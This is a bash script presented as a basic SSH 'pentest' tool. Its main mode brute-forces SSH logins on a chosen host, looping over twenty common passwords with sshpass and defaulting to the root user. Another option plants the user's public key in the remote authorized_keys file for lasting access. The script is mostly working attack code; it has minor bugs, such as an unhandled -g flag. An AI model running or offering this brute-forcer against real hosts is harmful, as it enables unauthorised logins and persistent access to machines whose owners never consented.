#!/bin/bash
# -*- coding: utf-8 -*-
# basic ssh "pentest"
#
# usage: bash s.sh -h HOST [-u USER] [-p PORT] [ -p[g] / -b ]

# from: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
passwords=(
root toor raspiraspi raspberry test uploader password admin administrator marketing
12345678 1234 12345 qwerty webadmin webmaster maintaince techsupport
letmein logon Passw@rd
)

while getopts h:u:p:kb opt #to make getopts expect an argument for an option,
do                         #place ':' after the proper option flag.
	case $opt in
		h)host=$OPTARG;;
		u)user=$OPTARG;;
		p)port=$OPTARG;;
		k)publickey=1;;  # config authentication with public key
		g)genNewKey=1;;  # generate a new keys pair
		b)bruteforce=1;; # bruteforce login with top20 common passwds
	esac
done

if [[ -n $host ]] #if $host is non-empty
then

	if [[ -z $user ]] #if $user is empty,
	then
		user="root" #default user
	fi
	if [[ -z $port ]] #if $port is empty,
	then
		port="22" #default port
	fi

	echo -e "$ ssh $user@$host -p $port\n"

	if [[ $publickey ]]
	then
		echo 'generating a public and private key pair..'
		echo -e '$ ssh-keygen -t rsa\n'
		ssh-keygen -t rsa

		echo 'configuring ssh authentication with public key for user $user..'
		echo -e '$ cat ~/.ssh/id_rsa.pub | ssh $user@$host -p $port "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"\n'
		cat ~/.ssh/id_rsa.pub | ssh $user@$host -p $port "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
	fi

	if [[ $bruteforce ]]
	then
		#TODO: check if sshpass is installed
		# echo 'installing sshpass for bruteforcing ssh login..'
		# echo -e '$ sudo apt install sshpass\n'
		# sudo apt install sshpass

		echo 'bruteforcing ssh login for user $user with top20 common passwds..'
		for passwd in ${passwords[*]}
		do
			echo -e "\n$ sshpass -p $passwd ssh -p $port $user@$host"
			sshpass -p $passwd ssh -p $port $user@$host
			#TODO: stop if it logs in
		done
	fi

else
	echo "required: -h hostIP"
fi
